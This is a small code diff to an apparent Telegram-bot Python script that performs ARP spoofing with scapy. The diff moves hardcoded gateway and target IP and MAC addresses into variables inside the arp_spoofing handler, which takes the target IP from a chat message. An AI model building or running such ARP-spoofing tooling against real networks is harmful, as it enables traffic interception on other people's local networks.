@@ -9,6 +9,10 @@ from scapy.all import ARP, Ether, send
 
 IP = range(1)
 
+g_ip = "192.168.75.1"
+g_mac = "00:50:56:F6:D3:5A"
+t_mac = "00:0C:29:14:84:48"
+
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
 
@@ -35,13 +39,13 @@ def target_ip(update, context):
 
 def arp_spoofing(update, context):
 
-    ip = update.message.text
+    t_ip = update.message.text
 
-    gateway_ip = "192.168.75.1"
-    gateway_mac = "00:50:56:F6:D3:5A"
+    gateway_ip = g_ip
+    gateway_mac = g_mac
     
-    target_ip = ip
-    target_mac = "00:0C:29:14:84:48"
+    target_ip = t_ip
+    target_mac = t_mac
 
     arp = ARP(pdst=target_ip)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
